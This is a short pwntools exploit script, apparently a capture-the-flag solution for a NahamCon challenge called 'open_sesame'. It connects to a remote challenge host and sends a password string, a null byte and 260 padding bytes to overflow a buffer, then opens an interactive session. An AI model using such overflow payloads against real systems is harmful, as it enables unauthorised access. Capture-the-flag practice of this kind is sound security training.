from pwn import *

#p = process("./open_sesame")
p = remote("challenge.nahamcon.com", 32743)

payload = b"OpenSesame!!!" + b"\x00" + b"A"*260
p.recvuntil(b"cave?")
p.sendline(payload)
p.interactive()